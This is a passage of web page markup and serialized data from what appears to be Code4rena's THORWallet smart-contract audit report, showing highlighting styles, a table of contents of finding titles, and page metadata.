0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .mtk14 { color: #F44747; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"1a:T975,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-2\"\u003eHigh Risk Findings (2)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\"\u003e[H-1] MergeTgt has no handling if TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE is exceeded during the exchange period\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\"\u003e[H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-1\"\u003eMedium Risk Findings (1)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\"\u003e[M-1] Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\"\u003eQA-01 Dust Amount Loss in Cross-Chain TITN Token Transfers\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-02-interface-documentation-references-wrong-token-standard\"\u003eQA-02 Interface Documentation References Wrong Token Standard\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-03-use-of-non-standard-erc-677-token-interface\"\u003eQA-03 Use of Non-Standard ERC-677 Token Interface\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-04-setter-functions-dont-check-for-value-changes\"\u003eQA-04 Setter Functions Don’t Check for Value Changes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\"\u003eQA-05 Permanent transfer restrictions on bridged tokens due to immutable isBridgedTokenHolder mapping\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-scope\"\u003eMitigation Review Scope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-summary\"\u003eMitigation Review Summary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#f-9-unmitigated\"\u003eF-9 Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"1b:{\"name\":\"THORWallet\",\"link\":\"https://x.com/thorwallet\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yf5zLz4KagP\"}\n1c:{\"start_time\":\"2025-02-20T20:00:00.000Z\",\"end_time\":\"2025-02-26T20:00:00.000Z\",\"bot_race_time_limit\":1}\n18:{\"uid\":\"EgJQA5H3J2S\",\"slug\":\"2025-02-thorwallet\",\"title\":\"THORWallet\",\"sponsor\":\"THORWallet\",\"date\":\"2025-04-15\",\"findings\":\"https://code4rena.com/audits/2025-02-thorwallet/submissions\",\"contest\":494,\"alt_url\":null,\"html\":\"$19\",\"toc\":\"$1a\",\"created_at\":\"2025-04-15T09:04:58.730Z\",\"updated_at\":\"2025-04-15T09:04:58.730Z\",\"sponsor_data\":\"$1b\",\"contest_data\":\"$1c\"}\n8:[\"$\",\"$L13\",null,{\"landingPage\":[\"$\",\"$L14\",null,{\"report\":{\"uid\":\"EgJQA5H3J2S\",\"slug\":\"2025-02-thorwallet\",\"title\":\"THORWallet\",\"sponsor\":\"THORWallet\",\"date\":\"2025-04-15\",\"findings\":\"https://code4rena.com/audits/2025-02-thorwallet/submissions\",\"contest\":494,\"alt_url\":null,\"html\":\"$15\",\"toc\":\"$16\",\"created_at\":\"2025-04-15T09:04:58.730Z\",\"updated_at\":\"2025-04-15T09:04:58.730Z\",\"sponsor_data\":{\"name\":\"THORWallet\",\"link\":\"https://x.com/thorwallet\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yf5zLz4KagP\"},\"contest_data\":{\"start_time\":\"2025-02-20T20:00:00.000Z\",\"end_time\":\"2025-02-26T20:00:00.000Z\",\"bot_race_time_limit\":1}}}],\"coreAppPage\":[\"$\",\"$L17\",null,{\"report\":\"$18\"}]}]\ne:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"application-name\",\"content\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabiliti"])</script><script>self.__next_f.push([1,"es, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"link\",\"14\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}],[\"$\",\"link\",\"15\",{\"rel\":\"icon\",\"href\":\"/logos/c4/c4-favicon-32.png\"}],[\"$\",\"link\",\"16\",{\"rel\":\"apple-touch-icon\",\"href\":\"/logos/c4/apple-touch-icon.png\"}],[\"$\",\"meta\",\"17\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])</script><next-route-announcer style="position: absolute;"><template shadowrootmode="open"><div aria-live="assertive" id="__next-route-announcer__" role="alert" style="position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;"></div></template></next-route-announcer><wcm-modal><template shadowrootmode="open"><!----><wcm-explorer-context><template shadowrootmode="open"><!----></template></wcm-explorer-context><wcm-theme-context><template shadowrootmode="open"><!----></template></wcm-theme-context><div id="wcm-modal" role="alertdialog" aria-modal="true" class=" wcm-overlay "><div class="wcm-container" tabindex="0"><!--?lit$711227539$--></div></div></template></wcm-modal></body></html>